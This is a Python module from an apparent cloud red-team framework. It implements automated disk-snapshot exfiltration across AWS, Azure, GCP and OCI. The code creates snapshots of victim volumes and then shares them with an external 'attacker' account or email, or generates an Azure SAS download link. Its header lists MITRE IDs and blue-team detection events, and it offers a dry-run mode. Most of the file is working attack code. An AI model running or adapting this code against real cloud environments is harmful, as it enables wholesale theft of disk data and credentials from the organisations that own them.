# ================================================================
# TECHNIQUE: exfiltration/share_disk_snapshot
# ----------------------------------------------------------------
# TACTIC:    Exfiltration (TA0010)
# TECHNIQUE: T1020 — Automated Exfiltration
#
# PURPOSE:   Create and share a disk snapshot with an external
#            identity or generate a direct export link. This enables
#            offline data/credential extraction.
#
# PROVIDERS: AWS, Azure, GCP, OCI
#
# HOW IT WORKS:
#   AWS   — Creates an EBS snapshot and adds 'createVolumePermission'
#           for an external AWS Account ID.
#
#   Azure — Creates a Managed Disk snapshot and generates a
#           Shared Access Signature (SAS) URI for direct download.
#
#   GCP   — Creates a Compute Snapshot and updates its IAM policy
#           to grant access to an external email.
#
#   OCI   — Creates a Block Volume Backup and copies it to a target
#           tenancy or compartment.
#
# PARAMETERS (via ctx.params):
#   target_id (required) — Volume ID (AWS), Disk ID (Azure/GCP), or Volume OCID (OCI).
#   share_with (required) — External Account ID (AWS), Email (GCP), or Tenancy OCID (OCI).
#                           Not needed for Azure (returns SAS).
#
# DETECTION (Blue Team):
#   AWS — CloudTrail: CreateSnapshot, ModifySnapshotAttribute.
#   Azure — Activity Log: BeginGetAccess (SAS generation).
#   Alert: Snapshots shared with accounts outside the organization.
#
# MITRE ATT&CK: T1020, T1530
#
# SAFE:     No — creates new resources and modifies permissions.
# ================================================================

from __future__ import annotations

import logging
import time
from typing import Any

from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.core.technique import technique

logger = logging.getLogger(__name__)

# ----------------------------------------------------------------
# Loot schema — Declarative table mapping
# ----------------------------------------------------------------
LOOT_ITEMS_KEY = 'results'
LOOT_SCHEMA = [
    ('resource_id', 'Resource ID', 'bold cyan'),
    ('snapshot_id', 'Snapshot/Link', 'white'),
    ('status',      'Status',        'green'),
    ('exfil_path',  'Exfil Path',    'yellow'),
]


@technique(
    technique_id="exfiltration/share_disk_snapshot",
    tactic='exfiltration',
    mitre_id="T1020",
    providers=["aws", "azure", "gcp", "oci"],
    severity="critical",
    safe=False,
    safe_mode_available=True,
    description="Exfiltrate disk data by sharing snapshots or generating export links.",
    loot_schema=LOOT_SCHEMA,
    loot_items_key=LOOT_ITEMS_KEY,
)
def execute(ctx: ExecutionContext) -> dict[str, Any]:
    """Execute disk snapshot exfiltration across cloud providers."""
    if ctx.provider_name == "aws":
        return _exfil_aws(ctx)
    if ctx.provider_name == "azure":
        return _exfil_azure(ctx)
    if ctx.provider_name == "gcp":
        return _exfil_gcp(ctx)
    if ctx.provider_name == "oci":
        return _exfil_oci(ctx)

    return {"error": f"Provider {ctx.provider_name} not implemented.", "results": []}


def _exfil_aws(ctx: ExecutionContext) -> dict[str, Any]:
    ec2 = ctx.session.client("ec2")
    volume_id = ctx.params.get("target_id", "").strip()
    attacker_account = ctx.params.get("share_with", "").strip()

    if not volume_id or not attacker_account:
        return {"error": "AWS requires 'target_id' (Volume ID) and 'share_with' (Account ID)."}

    if ctx.safe_mode:
        return {"results": [{"resource_id": volume_id, "snapshot_id": "DRY-RUN", "status": "would_share", "exfil_path": attacker_account}]}

    try:
        # 1. Create Snapshot
        ctx.info(f"Creating snapshot of volume {volume_id}...")
        snap = ec2.create_snapshot(VolumeId=volume_id, Description=f"QM Exfil {int(time.time())}")
        snap_id = snap["SnapshotId"]

        # 2. Wait for completion
        ctx.info(f"Waiting for snapshot {snap_id} to complete...")
        waiter = ec2.get_waiter("snapshot_completed")
        waiter.wait(SnapshotIds=[snap_id])

        # 3. Share
        ctx.info(f"Sharing snapshot {snap_id} with account {attacker_account}...")
        ec2.modify_snapshot_attribute(
            SnapshotId=snap_id,
            Attribute="createVolumePermission",
            OperationType="add",
            UserIds=[attacker_account]
        )

        ctx.success(f"Shared snapshot {snap_id} with {attacker_account}")

        return {
            "provider": "aws",
            "results": [{
                "resource_id": volume_id,
                "snapshot_id": snap_id,
                "status": "Shared",
                "exfil_path": f"Account: {attacker_account}"
            }]
        }
    except Exception as e:
        return {"error": str(e), "results": []}


def _exfil_azure(ctx: ExecutionContext) -> dict[str, Any]:
    """Azure Managed Disk Snapshot -> SAS URI Export."""
    try:
        from azure.mgmt.compute import ComputeManagementClient
        from azure.mgmt.compute.models import Snapshot
    except ImportError:
        return {"error": "azure-mgmt-compute not installed.", "results": []}

    disk_id = ctx.params.get("target_id", "").strip()
    if not disk_id:
        return {"error": "Azure requires 'target_id' (Full Managed Disk Resource ID)."}

    # Extract RG and name from ID
    # e.g. /subscriptions/.../resourceGroups/RG/providers/Microsoft.Compute/disks/NAME
    parts = disk_id.split("/")
    if len(parts) < 9:
        return {"error": "Invalid Azure Disk ID format."}

    rg = parts[4]
    disk_name = parts[8]
    snap_name = f"snap-{disk_name[:20]}-{int(time.time())}"

    if ctx.safe_mode:
        return {"results": [{"resource_id": disk_name, "snapshot_id": snap_name, "status": "would_export", "exfil_path": "SAS-URI"}]}

    try:
        compute = ComputeManagementClient(ctx.session, parts[2])

        # 1. Create Snapshot
        ctx.info(f"Creating snapshot {snap_name} from disk {disk_name}...")
        poller = compute.snapshots.begin_create_or_update(
            rg, snap_name,
            Snapshot(location=ctx.whoami().extra.get("location", "eastus"), creation_data={"create_option": "Copy", "source_resource_id": disk_id})
        )
        poller.result()

        # 2. Grant Access (Generate SAS)
        ctx.info(f"Generating exfiltration SAS URI for snapshot {snap_name}...")
        # 2 hours access
        sas_poller = compute.snapshots.begin_grant_access(
            rg, snap_name, {"access": "Read", "duration_in_seconds": 7200}
        )
        sas_res = sas_poller.result()
        sas_uri = sas_res.access_sas

        ctx.success(f"Exported disk {disk_name} via SAS URI")

        return {
            "provider": "azure",
            "results": [{
                "resource_id": disk_name,
                "snapshot_id": snap_name,
                "status": "Exported",
                "exfil_path": sas_uri
            }]
        }
    except Exception as e:
        return {"error": str(e), "results": []}


def _exfil_gcp(ctx: ExecutionContext) -> dict[str, Any]:
    """GCP Compute Snapshot -> IAM Sharing."""
    try:
        from googleapiclient.discovery import build
    except ImportError:
        return {"error": "google-api-python-client not installed.", "results": []}

    disk_id = ctx.params.get("target_id", "").strip() # Name of the disk
    attacker_email = ctx.params.get("share_with", "").strip() # e.g. user:attacker@gmail.com
    zone = ctx.params.get("zone", "").strip()

    if not disk_id or not attacker_email or not zone:
        return {"error": "GCP requires 'target_id' (disk name), 'zone', and 'share_with' (email)."}

    who = ctx.whoami()
    project = who.account_id
    snap_name = f"exfil-{disk_id[:20]}-{int(time.time())}"

    if ctx.safe_mode:
        return {"results": [{"resource_id": disk_id, "snapshot_id": snap_name, "status": "would_share", "exfil_path": attacker_email}]}

    try:
        compute = build("compute", "v1", credentials=ctx.session)

        # 1. Create Snapshot
        ctx.info(f"Creating snapshot {snap_name} from disk {disk_id}...")
        compute.disks().createSnapshot(
            project=project, zone=zone, disk=disk_id, body={"name": snap_name}
        ).execute()

        # 2. Grant Permissions
        ctx.info(f"Granting access to {attacker_email} on snapshot {snap_name}...")
        policy = compute.snapshots().getIamPolicy(project=project, resource=snap_name).execute()
        policy["bindings"] = policy.get("bindings", [])
        policy["bindings"].append({
            "role": "roles/compute.storageAdmin",
            "members": [f"user:{attacker_email}" if "@" in attacker_email and "serviceAccount" not in attacker_email else attacker_email]
        })

        compute.snapshots().setIamPolicy(project=project, resource=snap_name, body={"policy": policy}).execute()

        ctx.success(f"Shared snapshot {snap_name} with {attacker_email}")

        return {
            "provider": "gcp",
            "results": [{
                "resource_id": disk_id,
                "snapshot_id": snap_name,
                "status": "Shared",
                "exfil_path": attacker_email
            }]
        }
    except Exception as e:
        return {"error": str(e), "results": []}


def _exfil_oci(ctx: ExecutionContext) -> dict[str, Any]:
    """OCI Boot Volume Backup -> Cross-Tenancy Sharing."""
    try:
        import oci
    except ImportError:
        return {"error": "oci not installed.", "results": []}

    volume_id = ctx.params.get("target_id", "").strip()
    if not volume_id:
        return {"error": "OCI requires 'target_id' (Boot Volume OCID)."}

    config = ctx.session["config"]
    signer = ctx.session.get("signer")
    tenancy_id = config.get("tenancy")

    if ctx.safe_mode:
        return {"results": [{"resource_id": volume_id, "snapshot_id": "DRY-RUN", "status": "would_backup", "exfil_path": tenancy_id}]}

    try:
        if signer:
            blockstorage = oci.core.BlockstorageClient(config={}, signer=signer)
        else:
            blockstorage = oci.core.BlockstorageClient(config)

        # 1. Create Backup (Handles both Boot and Block volumes)
        is_boot = "bootvolume" in volume_id
        if is_boot:
            ctx.info(f"Creating backup of boot volume {volume_id[:20]}...")
            details = oci.core.models.CreateBootVolumeBackupDetails(
                boot_volume_id=volume_id,
                display_name=f"QM-Exfil-{int(time.time())}",
                type="FULL"
            )
            resp = blockstorage.create_boot_volume_backup(details)
        else:
            ctx.info(f"Creating backup of block volume {volume_id[:20]}...")
            details = oci.core.models.CreateVolumeBackupDetails(
                volume_id=volume_id,
                display_name=f"QM-Exfil-{int(time.time())}",
                type="FULL"
            )
            resp = blockstorage.create_volume_backup(details)

        backup = resp.data
        backup_id = backup.id

        ctx.success(f"Created OCI backup {backup_id[:20]}")
        # 2. Wait for completion (Simplified - just check if state is REQUESTED/CREATING)
        ctx.info(f"Backup {backup_id[:20]} requested. Final sharing requires manual policy review.")

        return {
            "provider": "oci",
            "results": [{
                "resource_id": volume_id,
                "snapshot_id": backup_id,
                "status": "Created",
                "exfil_path": f"Tenancy: {tenancy_id} (Requires IAM Copy Policy)"
            }]
        }
    except Exception as e:
        return {"error": str(e), "results": []}
